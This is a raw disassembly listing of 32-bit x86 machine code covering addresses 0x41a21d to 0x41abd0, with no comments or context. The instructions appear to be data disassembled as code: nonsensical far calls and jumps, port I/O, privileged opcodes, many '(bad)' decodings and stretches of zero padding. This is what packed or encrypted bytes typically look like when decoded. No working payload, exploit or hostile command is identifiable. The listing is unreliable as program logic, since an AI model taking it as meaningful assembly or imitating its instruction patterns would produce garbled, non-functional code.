  41a21d:	mov    edi,0xd8e21ad2
  41a222:	fisubr DWORD PTR [edi+0x72c328cc]
  41a228:	out    0xf7,eax
  41a22a:	and    ah,al
  41a22c:	mov    esi,esp
  41a22e:	xchg   BYTE PTR [edi+0x44],dl
  41a231:	test   eax,0xdf9e70d3
  41a236:	adc    DWORD PTR [esi],0x8611cc15
  41a23c:	jmp    0x9e1c446b
  41a241:	adc    dh,BYTE PTR [ebx]
  41a243:	js     0x41a2a5
  41a245:	arpl   WORD PTR [ebx],dx
  41a247:	inc    eax
  41a248:	xchg   BYTE PTR [esp+edx*4+0x5035d9c1],bh
  41a24f:	inc    esi
  41a250:	adc    DWORD PTR [ebx+0x7c02ccbf],0x16
  41a257:	test   dl,bl
  41a259:	aam    0x80
  41a25b:	mov    edi,0x413709fe
  41a260:	mov    cl,0x77
  41a262:	test   eax,0xe658bf
  41a267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a268:	ror    BYTE PTR [eax-0x44],0x9e
  41a26c:	pusha  
  41a26d:	and    al,0xd4
  41a26f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a270:	enter  0x48c1,0x63
  41a274:	call   0xc784:0x914ef59c
  41a27b:	inc    esi
  41a27c:	inc    eax
  41a27d:	fild   QWORD PTR [ecx]
  41a27f:	or     edx,ecx
  41a281:	push   0xffffffe3
  41a283:	and    al,0x5c
  41a285:	cmp    BYTE PTR [eax+0x4c7cd5bc],dh
  41a28b:	sub    ch,BYTE PTR [esi]
  41a28d:	push   ecx
  41a28e:	gs cwde 
  41a290:	inc    ebp
  41a291:	nop
  41a292:	bound  eax,QWORD PTR [ebx]
  41a294:	fcom   QWORD PTR [edx-0x7f9a62c4]
  41a29a:	test   al,0x5f
  41a29c:	call   0xd411:0x4f4115e5
  41a2a3:	mov    eax,ds:0xbbac1500
  41a2a8:	ret    0xc9b0
  41a2ab:	dec    ecx
  41a2ac:	mov    ds:0xeacda3cd,al
  41a2b1:	dec    edi
  41a2b2:	(bad)  
  41a2b3:	or     al,0xbc
  41a2b5:	mov    ebx,0x859041c0
  41a2ba:	sbb    al,dl
  41a2bc:	cmp    BYTE PTR [eax-0x40],0xa3
  41a2c0:	and    esi,ebx
  41a2c2:	test   DWORD PTR [ebp-0x71],ebx
  41a2c5:	cld    
  41a2c6:	xor    eax,0x299d9569
  41a2cb:	and    al,0xa6
  41a2cd:	ror    BYTE PTR [ecx],0xe7
  41a2d0:	repz inc eax
  41a2d2:	sub    BYTE PTR gs:[eax],ch
  41a2d5:	fs test eax,0xaae65ef9
  41a2db:	adc    bl,ah
  41a2dd:	call   0xaf69:0xd3c0e38
  41a2e4:	ret    
  41a2e5:	shl    BYTE PTR [ebx-0x4e],1
  41a2e8:	or     DWORD PTR [ecx+0xa74183],ecx
  41a2ee:	adc    DWORD PTR [esi],edx
  41a2f0:	sti    
  41a2f1:	jp     0x41a306
  41a2f3:	retf   
  41a2f4:	jle    0x41a366
  41a2f6:	push   edi
  41a2f7:	mov    ebp,0x92922666
  41a2fc:	xchg   BYTE PTR [ebp+0x4f2f5060],dh
  41a302:	push   es
  41a303:	dec    eax
  41a304:	(bad)  
  41a305:	fldcw  WORD PTR [ecx+0x47]
  41a308:	mov    al,cl
  41a30a:	and    edx,DWORD PTR [edx+esi*4]
  41a30d:	inc    eax
  41a30e:	(bad)  
  41a30f:	mov    BYTE PTR [ebx+0x0],dh
	...
  41a372:	add    BYTE PTR [eax],al
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	je     0x41a326
  41a382:	pop    ss
  41a383:	push   ds
  41a384:	sub    edx,DWORD PTR [esi]
  41a386:	add    DWORD PTR [eax],eax
  41a388:	add    eax,0x41000001
  41a38d:	je     0x41a3e9
  41a38f:	push   ss
  41a390:	or     ebp,DWORD PTR [ebp-0x4974a5f7]
  41a396:	outs   dx,DWORD PTR ds:[esi]
  41a397:	scas   eax,DWORD PTR es:[edi]
  41a398:	sbb    esp,DWORD PTR [edi+0x3a2cbd16]
  41a39e:	and    ecx,DWORD PTR [ebx+0x2532e448]
  41a3a4:	stc    
  41a3a5:	sahf   
  41a3a6:	(bad)  
  41a3a7:	mov    DWORD PTR [ebp+0x299314c1],edi
  41a3ad:	popf   
  41a3ae:	cmp    DWORD PTR [ebp+eiz*1-0x5929c8a7],edx
  41a3b5:	xor    bh,ah
  41a3b7:	sbb    eax,0x80a2bdf0
  41a3bc:	xor    ch,BYTE PTR [esi+0x31]
  41a3bf:	cmp    DWORD PTR ds:0x174d9d0b,0xdfd43764
  41a3c9:	call   0xf146:0x1d24e48c
  41a3d0:	or     bh,ah
  41a3d2:	loopne 0x41a405
  41a3d4:	mov    ecx,0x1e394417
  41a3d9:	xchg   BYTE PTR [eax-0x39],dh
  41a3dc:	out    0xa0,al
  41a3de:	jo     0x41a416
  41a3e0:	push   0x54
  41a3e2:	add    edi,ebx
  41a3e4:	in     eax,0x97
  41a3e6:	adc    BYTE PTR [eax+0x6fc369f5],cl
  41a3ec:	dec    eax
  41a3ed:	xor    DWORD PTR [edx+0x661fa849],eax
  41a3f3:	lahf   
  41a3f4:	push   eax
  41a3f5:	or     eax,0x88551698
  41a3fa:	xchg   esi,eax
  41a3fb:	ds mov al,0x77
  41a3fe:	inc    edi
  41a3ff:	sti    
  41a400:	push   ds
  41a401:	mov    bh,0x5f
  41a403:	inc    ecx
  41a404:	dec    ebp
  41a405:	jnp    0x41a424
  41a407:	or     DWORD PTR [edi+ecx*1+0x190d8d39],ecx
  41a40e:	stos   DWORD PTR es:[edi],eax
  41a40f:	mov    al,0xe
  41a411:	fstp   st(7)
  41a413:	pop    esi
  41a414:	rol    DWORD PTR [eax-0x619be896],cl
  41a41a:	pop    ds
  41a41b:	cmp    eax,0xc65d847b
  41a420:	je     0x41a43e
  41a422:	adc    ebp,DWORD PTR [esi+0x5d]
  41a425:	mov    bl,0x61
  41a427:	xchg   BYTE PTR [ecx+edx*4-0x17],cl
  41a42b:	push   ebx
  41a42c:	leave  
  41a42d:	pop    ss
  41a42e:	pop    esp
  41a42f:	xor    BYTE PTR [esp+edi*4-0x5b],cl
  41a433:	adc    eax,0xdfb90e84
  41a438:	in     eax,0xc2
  41a43a:	sahf   
  41a43b:	or     ch,BYTE PTR [edi]
  41a43d:	and    ebx,DWORD PTR [eax]
  41a43f:	loope  0x41a420
  41a441:	fdivr  DWORD PTR [esi]
  41a443:	mov    ah,0x68
  41a445:	jge    0x41a48b
  41a447:	cdq    
  41a448:	push   esi
  41a449:	xchg   esi,eax
  41a44a:	neg    DWORD PTR [ecx-0x74]
  41a44d:	fwait
  41a44e:	outs   dx,BYTE PTR ds:[esi]
  41a44f:	xor    BYTE PTR [ebp+0x659f5b36],ch
  41a455:	ss into 
  41a457:	cmp    ah,bl
  41a459:	xor    BYTE PTR [edi],dl
  41a45b:	lahf   
  41a45c:	test   BYTE PTR [eax-0x23],ah
  41a45f:	jl     0x41a4a1
  41a461:	outs   dx,BYTE PTR ds:[esi]
  41a462:	ds cs mov dh,0x7a
  41a466:	repz fdivr DWORD PTR [edi]
  41a469:	push   esi
  41a46a:	sahf   
  41a46b:	in     eax,0x8
  41a46d:	pop    ss
  41a46e:	test   BYTE PTR [ebp+0x7f],ch
  41a471:	fyl2x  
  41a473:	or     bl,dh
  41a475:	ror    DWORD PTR [ecx+0x42],cl
  41a478:	inc    edx
  41a479:	cmp    eax,ebp
  41a47b:	inc    ebp
  41a47c:	ins    DWORD PTR es:[edi],dx
  41a47d:	cs dec edi
  41a47f:	lods   eax,DWORD PTR fs:[esi]
  41a481:	add    edx,DWORD PTR [esi+0x35]
  41a484:	mov    eax,es
  41a486:	rcl    BYTE PTR [ebp+0x57],1
  41a489:	push   edi
  41a48a:	data16 jecxz 0x41a44c
  41a48d:	jecxz  0x41a486
  41a48f:	sbb    ah,BYTE PTR [edx+0x0]
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	jnp    0x41a56e
  41a502:	test   al,0x96
  41a504:	xor    BYTE PTR [edi],dl
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    eax,0x71000001
  41a50d:	cli    
  41a50e:	adc    al,0xd9
  41a510:	jne    0x41a4cc
  41a512:	cwde   
  41a513:	xchg   BYTE PTR [eax-0x48],dh
  41a516:	mov    eax,ds:0x1a6dc689
  41a51b:	sub    eax,esp
  41a51d:	cmp    al,BYTE PTR [ebx+0x6f]
  41a520:	sub    ebp,DWORD PTR [esi-0x43]
  41a523:	pop    esi
  41a524:	and    dl,al
  41a526:	(bad)  
  41a527:	shl    BYTE PTR [edi-0x31],1
  41a52a:	xchg   ebx,eax
  41a52b:	pop    edi
  41a52c:	mov    edx,0xbc91ece6
  41a531:	adc    al,0x43
  41a533:	outs   dx,BYTE PTR ds:[esi]
  41a534:	std    
  41a535:	mov    cl,0x7
  41a537:	pop    ebp
  41a538:	out    dx,al
  41a539:	push   0x6d528b83
  41a53e:	or     ebx,DWORD PTR [edx+edx*8+0x778f00e8]
  41a545:	popa   
  41a546:	push   ss
  41a547:	jns    0x41a4d5
  41a549:	add    dh,BYTE PTR [esp+ebx*8+0x36f015dd]
  41a550:	lods   al,BYTE PTR ds:[esi]
  41a551:	leave  
  41a552:	jnp    0x41a53c
  41a554:	mov    edx,DWORD PTR [ecx-0x5cff3713]
  41a55a:	(bad)  
  41a55b:	mov    BYTE PTR [edx+edx*8],0xe
  41a55f:	cmp    bl,cl
  41a561:	loopne 0x41a5b1
  41a563:	pop    esp
  41a564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a565:	fs pop eax
  41a567:	repz shl BYTE PTR [ebp-0x3d],cl
  41a56b:	jl     0x41a56d
  41a56d:	adc    DWORD PTR [ecx],0xffffffbb
  41a570:	xchg   ebp,eax
  41a571:	xor    ah,BYTE PTR [ecx-0x62f77de3]
  41a577:	scas   eax,DWORD PTR es:[edi]
  41a578:	or     eax,0xb90e72fe
  41a57d:	xor    eax,0xd0435ab1
  41a582:	nop
  41a583:	stos   BYTE PTR es:[edi],al
  41a584:	mov    ebp,0xc7b50ea1
  41a589:	adc    eax,0xa213a6b6
  41a58e:	outs   dx,BYTE PTR ds:[esi]
  41a58f:	ret    
  41a590:	into   
  41a591:	test   edi,edx
  41a593:	dec    esi
  41a594:	dec    edi
  41a595:	push   es
  41a596:	(bad)  
  41a598:	into   
  41a599:	mov    ch,BYTE PTR es:[ebx-0x4bfbc8ea]
  41a5a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5a1:	test   BYTE PTR [ebp-0x76383714],ah
  41a5a7:	inc    ecx
  41a5a8:	out    0x67,eax
  41a5aa:	jge    0x41a57c
  41a5ac:	adc    BYTE PTR [edx],0x88
  41a5af:	call   0x6b57:0xe911b1fc
  41a5b6:	xor    bh,bh
  41a5b8:	(bad)  
  41a5b9:	or     eax,0x27728fae
  41a5be:	in     eax,dx
  41a5bf:	fsubr  QWORD PTR [bp-0x27]
  41a5c3:	push   eax
  41a5c4:	(bad)  [ebp-0x20170178]
  41a5ca:	adc    al,0x56
  41a5cc:	sbb    al,0x96
  41a5ce:	ins    BYTE PTR es:[edi],dx
  41a5cf:	imul   ebp,DWORD PTR [ebp-0x2d],0x13
  41a5d3:	clc    
  41a5d4:	leave  
  41a5d5:	retf   
  41a5d6:	xchg   DWORD PTR [esp+eiz*4],edx
  41a5d9:	push   edx
  41a5da:	xor    edx,DWORD PTR es:[ebx-0x61588d54]
  41a5e1:	dec    edx
  41a5e2:	test   BYTE PTR [ecx-0x48],bl
  41a5e5:	les    edx,FWORD PTR [esi]
  41a5e7:	inc    eax
  41a5e8:	sub    al,0xf
  41a5ea:	sbb    al,0xa0
  41a5ec:	push   ds
  41a5ed:	adc    BYTE PTR [esi+0x51],bh
  41a5f0:	sbb    DWORD PTR [esi],0x4298718
  41a5f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5f7:	cmp    ah,BYTE PTR [esi]
  41a5f9:	popa   
  41a5fa:	ins    BYTE PTR es:[edi],dx
  41a5fb:	inc    edi
  41a5fc:	imul   esp,edx,0x23760f45
  41a602:	ficom  DWORD PTR [edx-0x66]
  41a605:	sar    dh,0x6f
  41a608:	das    
  41a609:	adc    cl,al
  41a60b:	xchg   ebp,eax
  41a60c:	fwait
  41a60d:	jp     0x41a591
  41a60f:	push   cs
  41a610:	add    BYTE PTR [eax],0x0
	...
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x7a44a625
  41a682:	adc    BYTE PTR [ecx+0x11835],ah
  41a688:	add    eax,0x1e000001
  41a68d:	jbe    0x41a65b
  41a68f:	psubb  mm5,QWORD PTR [ebx+eiz*4]
  41a693:	cmp    ebx,edi
  41a695:	adc    eax,0xf2cb9de1
  41a69a:	es mov dl,0x8b
  41a69d:	mov    ds:0xb873576e,eax
  41a6a2:	(bad)  
  41a6a4:	lock jp 0x41a70b
  41a6a7:	cmp    ch,BYTE PTR fs:[ebp-0x28206136]
  41a6ae:	and    eax,0x19100f5c
  41a6b3:	jmp    0x8b99e3d3
  41a6b8:	repz (bad)
  41a6bb:	das    
  41a6bc:	fnstsw WORD PTR [edi]
  41a6be:	push   esp
  41a6bf:	xchg   ebp,eax
  41a6c0:	daa    
  41a6c1:	pop    ss
  41a6c2:	jnp    0x41a707
  41a6c4:	and    DWORD PTR [ebp+0xd],edi
  41a6c7:	pop    ds
  41a6c8:	(bad)  
  41a6c9:	xchg   esi,eax
  41a6ca:	push   cs
  41a6cb:	push   ebx
  41a6cc:	lea    ecx,[eax-0x5db5d5e9]
  41a6d2:	mov    bl,0x44
  41a6d4:	xor    BYTE PTR [edi-0x1b9dbd1],al
  41a6da:	lods   al,BYTE PTR ds:[esi]
  41a6db:	jp     0x41a701
  41a6dd:	dec    esp
  41a6de:	mov    cl,0x36
  41a6e0:	and    ah,bh
  41a6e2:	sbb    al,0x6b
  41a6e4:	xchg   edx,eax
  41a6e5:	inc    eax
  41a6e6:	mov    edx,0x9dd8fab1
  41a6eb:	imul   esi,DWORD PTR [edi-0x386722f1],0x4e22f1b9
  41a6f5:	rcr    DWORD PTR [edi-0x4aeae58d],1
  41a6fb:	pop    ecx
  41a6fc:	inc    esp
  41a6fd:	ds xchg BYTE PTR ss:[esp+eiz*2+0x3044f76d],cl
  41a706:	leave  
  41a707:	movhps QWORD PTR [esi+0x40],xmm6
  41a70b:	in     al,0x80
  41a70d:	ss sub al,0x2e
  41a710:	je     0x41a71c
  41a712:	jmp    0x41a74d
  41a714:	xchg   edi,eax
  41a715:	mov    dl,0x23
  41a717:	(bad)  
  41a718:	mov    dl,0xc1
  41a71a:	aam    0x60
  41a71c:	jb     0x41a768
  41a71e:	lds    esp,FWORD PTR [edx]
  41a720:	mov    eax,0x33dd6986
  41a725:	adc    dl,BYTE PTR [esp+ebx*1-0x6d]
  41a729:	fild   DWORD PTR [esi]
  41a72b:	sub    cl,BYTE PTR [ebx]
  41a72d:	sub    dl,cl
  41a72f:	mov    ebx,0xa02b4468
  41a734:	adc    BYTE PTR [ebx+0x79],0xcb
  41a738:	stos   BYTE PTR es:[edi],al
  41a739:	pop    ebx
  41a73a:	fld    QWORD PTR [ecx+0x20]
  41a73d:	pop    esp
  41a73e:	cs clc 
  41a740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a741:	adc    al,0x22
  41a743:	ss dec ebp
  41a745:	es mov ah,0x1f
  41a748:	push   edi
  41a749:	mov    cl,0x48
  41a74b:	sbb    al,0x63
  41a74d:	out    0xde,al
  41a74f:	outs   dx,BYTE PTR ds:[esi]
  41a750:	inc    ebx
  41a751:	adc    al,0x99
  41a753:	inc    esp
  41a754:	push   ds
  41a755:	sub    eax,esi
  41a757:	call   0x75ec:0x746ab503
  41a75e:	in     eax,0x3a
  41a760:	xlat   BYTE PTR ds:[ebx]
  41a761:	or     BYTE PTR [ebp+0x4c],dl
  41a764:	adc    BYTE PTR [ecx-0x4a],0xbe
  41a768:	xlat   BYTE PTR ds:[ebx]
  41a769:	sub    DWORD PTR [edi],ecx
  41a76b:	pusha  
  41a76c:	sub    al,0xb3
  41a76e:	sub    BYTE PTR ds:0xe47e3781,ch
  41a774:	in     eax,dx
  41a775:	mov    bl,0x4c
  41a777:	push   esp
  41a779:	push   edx
  41a77a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a77b:	aam    0x5c
  41a77d:	and    al,0xce
  41a77f:	int    0x22
  41a781:	(bad)  
  41a782:	xchg   ebx,eax
  41a783:	or     dh,BYTE PTR [ebp+0x7]
  41a786:	ins    BYTE PTR es:[edi],dx
  41a787:	pusha  
  41a788:	mov    eax,edi
  41a78a:	jle    0x41a801
  41a78c:	shl    DWORD PTR [ecx+0xb75186],1
	...
  41a7f2:	add    BYTE PTR [eax],al
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0xd5327ca,al
  41a801:	xchg   ecx,eax
  41a802:	xor    cl,BYTE PTR [ebx+0x1193a]
  41a808:	add    eax,0x18000001
  41a80d:	sahf   
  41a80e:	mov    bl,0x9f
  41a810:	inc    ebp
  41a811:	lods   al,BYTE PTR ds:[esi]
  41a812:	push   eax
  41a813:	mov    edi,0x39d4a845
  41a818:	rol    DWORD PTR [edx],0x20
  41a81b:	mov    esp,0x179bb8ca
  41a820:	mov    cl,0x7d
  41a822:	(bad)  
  41a823:	mov    DWORD PTR [ebx],esp
  41a825:	test   al,0xf9
  41a827:	push   0x84fc806c
  41a82c:	sub    ecx,DWORD PTR [esi+0x54]
  41a82f:	inc    ebx
  41a830:	push   esp
  41a831:	push   0xd97d1054
  41a836:	jno    0x41a7fe
  41a838:	icebp  
  41a839:	push   esp
  41a83a:	fwait
  41a83b:	shl    DWORD PTR [esi],1
  41a83d:	dec    edi
  41a83e:	mov    dh,0xbf
  41a840:	aam    0x90
  41a842:	mov    cl,0x48
  41a844:	push   0x4d9f0e0c
  41a849:	fistp  WORD PTR ds:0xe79e5b1d
  41a84f:	fisub  DWORD PTR [edx-0xd44b812]
  41a855:	adc    BYTE PTR [edi-0x6d],0x20
  41a859:	leave  
  41a85a:	std    
  41a85b:	xor    al,0x40
  41a85d:	adc    eax,0xb2fa0351
  41a862:	cld    
  41a863:	jbe    0x41a8a7
  41a865:	jae    0x41a859
  41a867:	mov    al,ds:0xf62c3b3d
  41a86c:	test   eax,0xef4c1b89
  41a871:	ficomp DWORD PTR [eax+edi*1]
  41a874:	mov    dl,0x11
  41a876:	(bad)  
  41a877:	xchg   edi,eax
  41a878:	arpl   si,si
  41a87a:	xchg   ebx,esp
  41a87c:	aas    
  41a87d:	mov    esp,DWORD PTR [ebx]
  41a87f:	rcr    BYTE PTR [eax+0xdb0b46],cl
  41a885:	addr16 mov al,ds:0x4a35
  41a889:	push   0x5a
  41a88b:	std    
  41a88c:	mov    esp,0xaa26c0e7
  41a891:	mov    ebx,0x9a73e10f
  41a896:	sbb    dh,BYTE PTR [edx-0x23c1e48d]
  41a89c:	fldenv [edx-0x696dc0b]
  41a8a2:	imul   esp,DWORD PTR [edx-0x1a],0x1b
  41a8a6:	adc    eax,0x7451e65d
  41a8ab:	xchg   esi,eax
  41a8ac:	cwde   
  41a8ad:	xchg   BYTE PTR ds:0xd9ce9f71,ch
  41a8b3:	rcr    BYTE PTR [eax+0x63],0x21
  41a8b7:	sbb    al,0x5d
  41a8b9:	clc    
  41a8ba:	repnz arpl bp,di
  41a8bd:	int3   
  41a8be:	call   0x5fa2:0xed55b469
  41a8c5:	je     0x41a8dc
  41a8c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8c8:	hlt    
  41a8c9:	and    BYTE PTR [ebx-0x7f785a65],ah
  41a8cf:	in     al,dx
  41a8d0:	mov    ebp,0x42969d33
  41a8d5:	and    eax,0x7bea297c
  41a8da:	call   0xc5e8:0xa150f13
  41a8e1:	shl    BYTE PTR [ecx-0x5f431c94],0x8c
  41a8e8:	pop    ds
  41a8e9:	in     eax,0x65
  41a8eb:	and    ebx,DWORD PTR [ebx+0x21]
  41a8ee:	and    ah,0xbe
  41a8f1:	je     0x41a95b
  41a8f3:	scas   eax,DWORD PTR es:[edi]
  41a8f4:	mov    esi,DWORD PTR [eax-0x37acf75d]
  41a8fa:	inc    ebp
  41a8fb:	loopne 0x41a91a
  41a8fd:	push   esp
  41a8fe:	lock ret 0x8a43
  41a902:	leave  
  41a903:	adc    bh,BYTE PTR [eax]
  41a905:	aad    0xa9
  41a907:	add    al,0xab
  41a909:	jp     0x41a95f
  41a90b:	push   0x13
  41a90d:	test   BYTE PTR [ecx],ch
  41a90f:	cmp    BYTE PTR [esi+0x0],0x0
	...
  41a972:	add    BYTE PTR [eax],al
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	mov    ebp,0x3ffceb1e
  41a985:	sbb    al,BYTE PTR [ecx]
  41a987:	add    BYTE PTR ds:0xf8000001,al
  41a98d:	xchg   esp,eax
  41a98e:	ss pop esp
  41a990:	aaa    
  41a991:	daa    
  41a992:	jmp    0xc051:0xffc48c76
  41a999:	idiv   bh
  41a99b:	adc    ebp,DWORD PTR [edx]
  41a99d:	jg     0x41aa15
  41a99f:	aad    0x4a
  41a9a1:	test   BYTE PTR [ecx+0x4a],cl
  41a9a4:	mov    al,0xcb
  41a9a6:	jne    0x41a97a
  41a9a8:	inc    esi
  41a9a9:	push   ebp
  41a9aa:	mov    ds:0xacc5c17e,eax
  41a9af:	outs   dx,DWORD PTR ds:[esi]
  41a9b0:	and    al,0xa0
  41a9b2:	ins    DWORD PTR es:[edi],dx
  41a9b3:	loopne 0x41aa07
  41a9b5:	pop    ebx
  41a9b6:	jp     0x41a977
  41a9b8:	loope  0x41a955
  41a9ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9bb:	stos   DWORD PTR es:[edi],eax
  41a9bc:	out    0xfc,eax
  41a9be:	add    ebp,DWORD PTR [ecx-0x42]
  41a9c1:	and    eax,0xf0a6e76b
  41a9c6:	fldcw  WORD PTR ds:0x95fcb03a
  41a9cc:	(bad)  
  41a9cd:	jb     0x41a9a4
  41a9cf:	mov    ch,0xfe
  41a9d1:	pop    ecx
  41a9d2:	test   DWORD PTR [ebx+0x6bc1f40f],0xa28798f8
  41a9dc:	jne    0x41a963
  41a9de:	arpl   WORD PTR [ebp-0x49],sp
  41a9e1:	scas   eax,DWORD PTR es:[edi]
  41a9e2:	mov    eax,ds:0x93cd3532
  41a9e7:	sar    BYTE PTR [esp+esi*8-0x26],0xbb
  41a9ec:	in     eax,dx
  41a9ed:	and    DWORD PTR [esi],edx
  41a9ef:	xchg   ebx,eax
  41a9f0:	das    
  41a9f1:	sbb    al,0x68
  41a9f3:	sub    DWORD PTR ds:0xa818ff21,0xffffffa2
  41a9fa:	pop    ebx
  41a9fb:	inc    edx
  41a9fc:	lds    esi,FWORD PTR [ecx]
  41a9fe:	pop    ebp
  41a9ff:	icebp  
  41aa00:	gs lock fwait
  41aa03:	mov    bl,0x88
  41aa05:	jg     0x41aa63
  41aa07:	retf   
  41aa08:	jecxz  0x41aa1b
  41aa0a:	sbb    eax,0xffffffdc
  41aa0d:	rol    eax,cl
  41aa0f:	test   DWORD PTR [ecx],ebp
  41aa11:	repnz or ah,BYTE PTR [ebx+0x20]
  41aa15:	repz fidiv WORD PTR [ecx+0x62e29aa8]
  41aa1c:	scas   eax,DWORD PTR es:[edi]
  41aa1d:	add    eax,esp
  41aa1f:	sub    al,0xaf
  41aa21:	leave  
  41aa22:	into   
  41aa23:	xchg   esp,eax
  41aa24:	sbb    DWORD PTR [edi+0x0],edx
  41aa27:	mov    dh,0x75
  41aa29:	into   
  41aa2a:	mov    ah,0x77
  41aa2c:	int3   
  41aa2d:	xor    esp,DWORD PTR [esi]
  41aa2f:	push   cs
  41aa30:	jge    0x41a9c8
  41aa32:	and    ebp,DWORD PTR [eax-0x27]
  41aa35:	ins    BYTE PTR es:[edi],dx
  41aa36:	sub    dl,dh
  41aa38:	mov    ecx,ebp
  41aa3a:	jl     0x41aa1d
  41aa3c:	loop   0x41aa0b
  41aa3e:	sbb    DWORD PTR [ecx],ebp
  41aa40:	fbstp  TBYTE PTR [edx]
  41aa42:	xor    DWORD PTR [eax-0x42cae201],esp
  41aa48:	je     0x41a9ca
  41aa4a:	xchg   esi,eax
  41aa4b:	pop    ebp
  41aa4c:	or     dl,BYTE PTR [ecx-0x29]
  41aa4f:	aam    0x22
  41aa51:	inc    edi
  41aa52:	stos   BYTE PTR es:[edi],al
  41aa53:	push   ebx
  41aa54:	jmp    0x41aa78
  41aa56:	(bad)  
  41aa57:	pop    ebp
  41aa58:	sbb    edx,DWORD PTR [eax-0x65]
  41aa5b:	call   FWORD PTR ds:0x9ee649d8
  41aa61:	pop    ss
  41aa62:	dec    edi
  41aa63:	retf   
  41aa64:	pop    esp
  41aa65:	outs   dx,BYTE PTR ds:[esi]
  41aa66:	ins    DWORD PTR es:[edi],dx
  41aa67:	loop   0x41a9f1
  41aa69:	jb     0x41aa72
  41aa6b:	addr16 xchg edx,eax
  41aa6d:	mov    BYTE PTR [ebx-0x2df1c8d6],0x1d
  41aa74:	sub    al,0x1e
  41aa76:	add    DWORD PTR [ecx-0x2bc989d4],esp
  41aa7c:	inc    ecx
  41aa7d:	cld    
  41aa7e:	dec    ebx
  41aa7f:	mov    WORD PTR [ecx+edx*1],gs
  41aa82:	mov    esp,0xf4806136
  41aa87:	test   DWORD PTR [eax+eax*4+0x5b416dcc],ebx
  41aa8e:	and    eax,0xd75f
	...
  41aaf3:	add    bh,dh
  41aaf5:	add    esp,ebx
  41aaf7:	mov    ah,0xfe
  41aaf9:	std    
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	shl    cl,0xeb
  41ab03:	mov    bh,0x44
  41ab05:	sbb    eax,DWORD PTR [ecx]
  41ab07:	add    BYTE PTR ds:0x72000001,al
  41ab0d:	(bad)  
  41ab0e:	aas    
  41ab0f:	push   edx
  41ab10:	into   
  41ab11:	dec    ebx
  41ab12:	sub    cl,bh
  41ab14:	inc    ebx
  41ab15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab16:	ficomp DWORD PTR [esi-0x29]
  41ab19:	scas   eax,DWORD PTR es:[edi]
  41ab1a:	es dec ecx
  41ab1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab1d:	jmp    0x41aaa3
  41ab1f:	push   0xd8ad5527
  41ab24:	jno    0x41aaa7
  41ab26:	mov    ds:0xb7613c24,al
  41ab2b:	loop   0x41ab00
  41ab2d:	push   0x15
  41ab2f:	mov    dl,0xb2
  41ab31:	stos   BYTE PTR es:[edi],al
  41ab32:	push   esi
  41ab33:	sbb    BYTE PTR [ebp+0xddc5bb5],0x52
  41ab3a:	mov    ebx,0x1e655462
  41ab3f:	pusha  
  41ab40:	retf   0x4e92
  41ab43:	retf   
  41ab44:	enter  0x5d90,0x1f
  41ab48:	sub    eax,0xaacff006
  41ab4d:	fisttp DWORD PTR [esi+edx*2+0x4a903c25]
  41ab54:	xchg   edi,eax
  41ab55:	fwait
  41ab56:	ss add al,0x83
  41ab59:	or     BYTE PTR [ecx-0x1e56bfca],dl
  41ab5f:	jmp    0x2f269186
  41ab64:	or     eax,ebx
  41ab66:	and    BYTE PTR [edx],ah
  41ab68:	push   0xa63d2a56
  41ab6d:	popf   
  41ab6e:	sbb    eax,0x9789d6c7
  41ab73:	cmp    edx,edi
  41ab75:	adc    dh,BYTE PTR cs:[ebp-0x3772e126]
  41ab7c:	xor    dl,BYTE PTR [ebx-0x6b08327d]
  41ab82:	mov    ebx,0x6db3899f
  41ab87:	cs dec eax
  41ab89:	ja     0x41ab44
  41ab8b:	mov    WORD PTR [edi-0x5524ba98],ss
  41ab91:	sub    al,ch
  41ab93:	cmp    edx,0xffffffc1
  41ab96:	data16 lods al,BYTE PTR ds:[esi]
  41ab98:	pop    ebx
  41ab99:	in     al,0x77
  41ab9b:	call   0xfff0ce2b
  41aba0:	(bad)  
  41aba1:	dec    esi
  41aba2:	shl    DWORD PTR [esi+edx*2],cl
  41aba5:	inc    ebp
  41aba6:	inc    esi
  41aba7:	lods   al,BYTE PTR ds:[esi]
  41aba8:	test   BYTE PTR ds:0x901be8dc,ah
  41abae:	mov    edx,0x85a401d7
  41abb3:	jo     0x41abb4
  41abb5:	mov    ds:0x1d5f3e53,al
  41abba:	in     eax,0x1f
  41abbc:	and    eax,DWORD PTR [ebx+0x69]
  41abbf:	arpl   WORD PTR [ebx+0x55],cx
  41abc2:	shr    al,cl
  41abc4:	adc    DWORD PTR [eax-0x5f],esp
  41abc7:	outs   dx,DWORD PTR ds:[esi]
  41abc8:	in     al,0xa3
  41abca:	clc    
  41abcb:	sbb    BYTE PTR [ecx],bh
  41abcd:	aaa    
  41abce:	(bad)  
  41abd0:	ret    0xbeaa
